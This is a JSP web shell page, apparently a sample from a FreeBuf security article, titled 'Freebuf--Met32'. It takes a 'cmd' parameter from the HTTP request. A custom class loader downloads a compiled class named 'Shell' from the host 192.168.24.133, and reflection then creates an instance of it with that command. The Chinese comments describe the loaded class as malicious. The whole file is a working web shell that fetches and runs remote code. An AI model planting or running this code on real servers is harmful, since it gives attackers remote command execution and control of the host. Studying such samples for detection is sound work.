<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.net.MalformedURLException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.lang.reflect.Constructor" %>
<html>
<head>
    <title>Freebuf--Met32</title>
</head>
<body>
<%
    String cmd = request.getParameter("cmd");
//自定义类加载器
    ClassLoader classLoader = new ClassLoader() {
        private String url="http://192.168.24.133/";

        //重写findClass，遵循双亲委派机制
        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            String path = url+name+".class";
            byte[] data = new byte[0];
            try {
                URL url = new URL(path);
                InputStream inputStream = url.openStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte buf[] = new byte[1024];
                int len;
                while((len=inputStream.read(buf))!=-1){
                    baos.write(buf,0,len);
                }
                data = baos.toByteArray();
                inputStream.close();
                baos.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return defineClass(name,data,0,data.length);
        }
    };

//通过自定义类加载器URLClassLoader加载编译的恶意class，恶意类名为Shell
    Class cls = classLoader.loadClass("Shell");
    Constructor constructors = cls.getConstructor(String.class);
//反射创建恶意类实例
    constructors.newInstance(cmd);
%>
test
</body>
</html>